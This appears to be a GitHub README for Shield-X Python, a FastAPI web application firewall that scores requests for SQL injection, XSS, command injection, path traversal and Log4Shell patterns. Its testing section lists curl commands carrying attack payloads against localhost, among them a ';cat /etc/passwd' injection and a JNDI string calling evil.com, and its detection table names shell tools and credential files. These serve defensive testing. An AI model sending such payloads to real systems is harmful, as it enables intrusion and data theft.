# 🛡️ Shield-X Python V9 — Standalone Layer 7 WAF

**Production-hardened Web Application Firewall in pure Python (FastAPI) — no .NET required.**

[![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-ASGI-009688?logo=fastapi)](https://fastapi.tiangolo.com)
[![Redis](https://img.shields.io/badge/Redis-Optional-DC382D?logo=redis)](https://redis.io)
[![Version](https://img.shields.io/badge/Version-V9%20Hardened-blueviolet)](#)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

> 💡 **Want the full enterprise stack?** .NET 10 gateway + GeoIP + browser fingerprinting + real-time SignalR dashboard:
> → [ShieldX-L7-DeepDefense](https://github.com/InsaneInfinity/ShieldX-L7-DeepDefense)

---

## 🚀 What is this?

Shield-X Python is a **standalone Layer 7 WAF** — one Python process, zero .NET dependency.

- Run it in front of any backend app
- Works immediately without Redis (RAM-only fallback)
- When Redis is available, bans sync automatically with any .NET node running [ShieldX-L7-DeepDefense](https://github.com/InsaneInfinity/ShieldX-L7-DeepDefense)

---

## 🗺️ How It Works

```
Incoming Request
      │
      ▼
┌─────────────────────────────────────────────┐
│            ShieldXMiddleware                │
│                                             │
│  1. Whitelist check      → pass through     │
│  2. Local RAM ban cache  → 403 BANNED       │
│  3. Redis ban check      → 403 BANNED       │
│  4. Rate limit           → 429 RATE_LIMITED │
│      sliding window ZSET, 100 req/60s       │
│                                             │
│  5. analyze_request()                       │
│      ├─ URL decode path + query             │
│      ├─ Read body chunk-by-chunk            │
│      │   └─ > 10 MB → score 999            │
│      ├─ Skip binary Content-Type            │
│      ├─ Scan first 64 KB of body            │
│      └─ Regex scan path + query + body      │
│                                             │
│  6. score 999   → 413 Body Too Large        │
│  7. score ≥ 80  → BAN IP + 403 BLOCKED      │
│  8. score 40–79 → WARN + publish event      │
│  9. score < 40  → pass through              │
└─────────────────────────────────────────────┘
      │
      ▼
  Your Backend App
```

---

## 🎯 Attack Detection

| Attack | Score | What triggers it |
|---|---|---|
| `LOG4J` | **100** | `${jndi:`, `${lower:`, `${upper:` variants |
| `CMD_INJECTION` | **95** | shell operator + known binary (`bash`, `wget`, `curl`, `nc`, `python`...) |
| `SQL_INJECTION` | **90** | `UNION SELECT`, `DROP TABLE`, `EXEC(`, `sleep()`, `OR 1=1`, `xp_*`... |
| `XSS` | **85** | `<script>`, `onerror=`, `javascript:`, `document.cookie`, `alert()`... |
| `PATH_TRAVERSAL` | **75** | `../../`, `%2e%2e/` + targets: `etc/passwd`, `.env`, `config.php`... |
| `HEADER_INJECTION` | **70** | `\r\n` + known header name injected into a field value |

**Score thresholds:**

| Score | Action |
|---|---|
| `≥ 80` | **BAN** IP in Redis + local cache → `403 BLOCKED` |
| `40–79` | **WARN** — log + publish Redis event → pass through |
| `< 40` | **CLEAN** — pass through silently |

---

## ✨ Key Features

- **Standalone** — single Python process, no .NET, no external gateway required
- **Body Scanning** — reads POST/PUT body chunk-by-chunk (never loads full payload into RAM), scans first 64 KB, reattaches body so your backend still receives it intact
- **Binary Guard** — skips regex scan for `image/*`, `video/*`, `audio/*`, `application/pdf`, `application/zip`, `application/wasm` — no false positives on file uploads
- **URL Decoding** — `urllib.parse.unquote()` before every scan — catches encoded payloads: `%27` → `'`, `%3Cscript%3E` → `<script>`
- **Sliding Window Rate Limiter** — Redis ZSET per IP, 100 req/60s, `Retry-After` header on 429
- **Tiered Ban Cache** — local RAM cache (30s TTL) + Redis — blocked IPs get instant `403` without a Redis round-trip
- **Redis Event Bus** — publishes JSON events to 4 Pub/Sub channels (compatible with ShieldX-L7-DeepDefense SignalR dashboard)
- **Fail-Open** — Redis offline? Falls back to RAM-only, zero crashes, structured error logging (no silent `except: pass`)
- **Gradual Scoring** — different attack types carry different weights, warn mode lets you monitor suspicious traffic without over-blocking

---

## 📡 Redis Pub/Sub Channels

| Channel | Triggered by | Payload |
|---|---|---|
| `shieldx:bans:ip` | IP banned | `"1.2.3.4"` |
| `shieldx:events:rate_limit` | Rate limit hit | `{"ip": "...", "requests": 105}` |
| `shieldx:events:suspect` | Score 40–79 | `{"ip": "...", "reason": "XSS", "score": 75}` |
| `shieldx:events:body_too_large` | Body > 10 MB | `{"ip": "...", "size_bytes": ...}` |

These channels are consumed by [ShieldX-L7-DeepDefense](https://github.com/InsaneInfinity/ShieldX-L7-DeepDefense) — bans sync automatically between Python and .NET nodes.

---

## ⚙️ Configuration

Edit constants at the top of `shield_x_middleware.py`:

| Parameter | Default | Description |
|---|---|---|
| `REDIS_URL` | `redis://localhost:6379` | Redis connection string |
| `BAN_TTL_SECONDS` | `3600` | How long a ban lasts in Redis |
| `BAN_CACHE_TTL` | `30` | Local RAM cache TTL for bans (seconds) |
| `RATE_LIMIT_WINDOW` | `60` | Sliding window duration (seconds) |
| `RATE_LIMIT_MAX_REQUESTS` | `100` | Max requests per IP per window |
| `SCORE_BLOCK_THRESHOLD` | `80` | Score ≥ this → BAN + 403 |
| `SCORE_WARN_THRESHOLD` | `40` | Score ≥ this → WARN only |
| `MAX_BODY_SCAN_BYTES` | `65536` (64 KB) | Max body bytes passed through regex |
| `MAX_BODY_READ_BYTES` | `10485760` (10 MB) | Body larger than this → 413 |
| `WHITELISTED_IPS` | `set()` | IPs that bypass all checks |

---

## 📁 Project Structure

```
ShieldX-Python/
├── shield_x_middleware.py   # ← V9 Production WAF — this is the main file
├── main.py                  # ← V8 Prototype — kept for reference
├── requirements.txt
└── __pycache__/
```

> ⚠️ `main.py` is the older V8 prototype. The production code is `shield_x_middleware.py`.

---

## 🚀 Quick Start

### Prerequisites
- Python 3.12+
- Redis *(optional)*

```bash
git clone https://github.com/InsaneInfinity/ShieldX-Python.git
cd ShieldX-Python

pip install -r requirements.txt

python shield_x_middleware.py
# Listening on http://127.0.0.1:8000
```

**No Redis?** Shield-X detects it on startup, logs a warning and switches to RAM-only mode automatically. No config changes needed.

---

## 🧪 Testing

```bash
# Health check
curl http://127.0.0.1:8000/health

# Clean request — 200 OK
curl "http://127.0.0.1:8000/"

# SQL Injection — 403 BLOCKED (score 90)
curl "http://127.0.0.1:8000/?id=1+UNION+SELECT+*+FROM+users"

# XSS — 403 BLOCKED (score 85)
curl "http://127.0.0.1:8000/?q=<script>alert(1)</script>"

# Encoded XSS — 403 BLOCKED (decoded before scan)
curl "http://127.0.0.1:8000/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

# Path Traversal — 403 BLOCKED (score 75)
curl "http://127.0.0.1:8000/?file=../../etc/passwd"

# Command Injection — 403 BLOCKED (score 95)
curl "http://127.0.0.1:8000/?cmd=;cat+/etc/passwd"

# Log4Shell via header — 403 BLOCKED (score 100)
curl "http://127.0.0.1:8000/" -H 'X-Api-Version: ${jndi:ldap://evil.com/x}'

# POST body scan — 403 BLOCKED
curl -X POST "http://127.0.0.1:8000/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "1 OR 1=1--"}'

# Rate limit — 429 after 100 req/min
for i in $(seq 1 105); do curl -s http://127.0.0.1:8000/ > /dev/null; done
```

**Response examples:**

```json
{ "status": "BLOCKED",      "threat": "SQL_INJECTION", "score": 90 }
{ "status": "BANNED",       "msg": "Zbanowany za: SQL_INJECTION" }
{ "status": "RATE_LIMITED", "msg": "Za dużo requestów. Zwolnij." }
{ "status": "REJECTED",     "msg": "Request body zbyt duży." }
{ "status": "ok", "redis": "connected", "mode": "full" }
{ "status": "ok", "redis": "offline",   "mode": "local-only" }
```

---

## 🇵🇱 Opis projektu

Shield-X Python V9 to samodzielny WAF napisany w FastAPI — działa bez .NET, bez dodatkowego gateway'a. Wystarczy jeden proces Pythona.

Middleware czyta body chunk po chunku, odkodowuje URL przed skanem (`%27` → `'`), pomija binarne Content-Type i skanuje path, query oraz body pod kątem 6 kategorii ataków z gradacją score (70–100). Przy score ≥ 80 IP jest banowane w Redis i lokalnym cache. Przy score 40–79 system loguje podejrzany ruch bez banowania. Rate limiter oparty na sliding window Redis ZSET blokuje przy 100 req/min.

Redis jest opcjonalny — bez niego działa w trybie RAM-only. Gdy Redis jest dostępny, bany synchronizują się automatycznie z węzłami .NET z [ShieldX-L7-DeepDefense](https://github.com/InsaneInfinity/ShieldX-L7-DeepDefense).

---

## ⚖️ License

MIT — free to use, modify and distribute.

> Disclaimer: This project was developed for educational purposes and infrastructure security audits. Always ensure compliance with local laws when deploying security tools.

---

Built with ❤️ — because "standard" protection is never enough.
